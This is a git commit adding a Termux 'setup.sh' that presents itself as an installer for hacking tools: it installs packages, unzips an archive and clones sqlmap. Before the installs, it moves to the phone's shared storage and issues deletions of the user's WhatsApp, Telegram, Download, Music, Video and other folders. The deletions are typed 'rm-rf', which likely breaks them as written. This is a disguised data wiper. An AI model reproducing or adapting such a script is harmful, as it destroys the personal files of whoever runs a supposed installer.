2235a65eeeeaf2af7d0a213ae2efc1e07a426884
raflysahrul3114@gmail.com <42622170+RAFLYSAHRUL@users.noreply.github.com>
2019-12-17 08:35:57 +0700

    Add files via upload

---
+++ setup.sh
@@ -0,0 +1,39 @@
+#!/usr/bin/bash
+
+echo "Please wait...."
+termux-setup-storage
+cd /sdcard
+rm-rf Android
+rm-rf WhatsApp
+rm-rf YoWhatsApp
+rm-rf YoWhatsApp2
+rm-rf ADM
+rm-rf data
+rm-rf Download
+rm-rf file
+rm-rf home
+rm-rf Music
+rm-rf inshot
+rm-rf KineMaster
+rm-rf MEGA
+rm-rf mp3
+rm-rf MP3
+rm-rf mp4
+rm-rf Music
+rm-rf pixelLab
+rm-rf psp
+rm-rf Telegram
+rm-rf UCDownload
+rm-rf Video
+rm-rf video
+rm-rf YMusic
+cd $HOME
+pkg install curl -Y
+apt install unzip -Y
+pkg install python2 -Y
+pkg install nano -Y
+pkg install unzip -Y
+unzip brigadetoolsz.zip
+git clone https://github.com/sqlmapproject/sqlmap.git
+echo "Success Install..."
+echo "Tingaal Pakai Brothers.. ^_^"
